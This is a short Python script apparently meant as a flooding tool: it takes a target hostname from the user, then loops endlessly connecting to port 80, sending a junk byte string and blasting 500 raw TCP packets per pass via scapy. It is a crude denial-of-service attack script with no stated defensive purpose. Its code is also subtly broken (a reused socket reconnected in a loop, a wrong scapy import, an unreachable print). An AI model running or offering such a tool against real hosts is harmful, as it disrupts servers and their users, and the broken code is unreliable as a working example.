#-*-coding:utf8;-*-
import socket
from socket import AF_INET , SOCK_STREAM
from scapy import *
url = input("entre target :")
s = socket.socket( AF_INET , SOCK_STREAM )
while True :
    ip = socket.gethostbyname(url)

    s.connect((ip, 80))
    data = b'hdjjjdjdjdjdtzgopziebwbxqjeyxvmdmfifuebwbxkqaerozykbcx578043hg09gcxfjkyrnxbwgdj'
    send(IP(dst=ip) /TCP(dport=80), count=500)
    s.send(data)
print('sending.....')
